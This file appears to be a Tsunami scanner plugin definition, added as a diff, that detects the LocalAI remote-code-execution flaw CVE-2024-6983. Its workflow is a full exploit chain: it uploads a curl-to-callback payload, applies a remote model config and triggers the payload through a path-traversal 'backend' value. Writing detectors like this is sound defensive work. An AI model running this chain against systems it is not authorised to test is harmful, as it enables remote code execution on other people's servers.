@@ -1,0 +1,174 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MudlerLocalAI_CVE_2024_6983"
+  author: 
+    "Robert Dick (robert@doyensec.com) for templated version, "
+    "frkngksl for original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2024_6983"
+  }
+  severity: CRITICAL
+  title: "CVE-2024-6983 Mudler LocalAI RCE"
+  description: 
+    "The Mudler LocalAI has API endpoints that allow its users to interact with"
+    " model functionalities. The vulnerability here allows an attacker to"
+    " upload a configuration file that includes a URI pointing to a malicious"
+    " binary file through '/models/apply' endpoint. When the software"
+    " processes this configuration file, it downloads the binary without"
+    " conditional checking. By triggering the new model, created by this"
+    " malicious configuration file, over the '/embeddings' endpoint, an"
+    " attacker could trigger it by passing the malicious file location"
+    " through the 'backend' parameter of this request."
+  recommendation: "You can upgrade your Mudler LocalAI instances to 2.19.4 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-6983"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_localai"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: 'LocalAI instance!' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "upload_model_file"
+  http_request: {
+    method: POST
+    uri: "/v1/files"
+    headers: [
+      { name: "Content-Type" value: "multipart/form-data; boundary=--WebKitFormBoundary7MA4YWxkTrZu0gW" }
+    ]
+    data:
+      "----WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
+      "Content-Disposition: form-data; name=\"purpose\"\r\n\r\n"
+      "fine-tune\r\n"
+      "----WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
+      "Content-Disposition: form-data; name=\"file\"; filename=\"tsunamiPayload.txt\"\r\n"
+      "Content-Type: text/plain\r\n\r\n"
+      "curl {{ T_CBS_URI }}\r\n"
+      "----WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
+    response: {
+      http_status: 200
+      extract_any: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: '"id":"([^"]*)"'
+            variable_name: "FILE_ID"
+          },
+          {
+            from_body: {}
+            regexp: '"id": "([^"]*)"'
+            variable_name: "FILE_ID"
+          }
+        ]
+      }
+    }
+  }
+  cleanup_actions: "delete_payload"
+}
+
+actions: {
+  name: "upload_config_file"
+  http_request: {
+    method: POST
+    uri: "/models/apply"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"life\",\"config_url\":\"{{ CONFIG_FILE_URL }}\",\"id\":\"\"}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: '"uuid"' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_model"
+  http_request: {
+    method: POST
+    uri: "/embeddings"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"backend\":\"../../../../../../build/models/app.bin\",\"model\":\"life\",\"input\":\"hi\"}"
+  }
+}
+
+actions: {
+  name: "delete_payload"
+  http_request: {
+    method: DELETE
+    uri: "/v1/files/{{ FILE_ID }}"
+    response: {
+      expect_all: {
+        conditions: [
+          { body: {} contains: 'Deleted' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  variables: [
+    { name: "CONFIG_FILE_URL" value: "https://raw.githubusercontent.com/google/tsunami-security-scanner-plugins/master/payloads/mudler_localai_rce/model.yaml" }
+  ]
+  actions: [
+    "fingerprint_localai",
+    "upload_model_file",
+    "upload_config_file",
+    "sleep",
+    "trigger_model",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
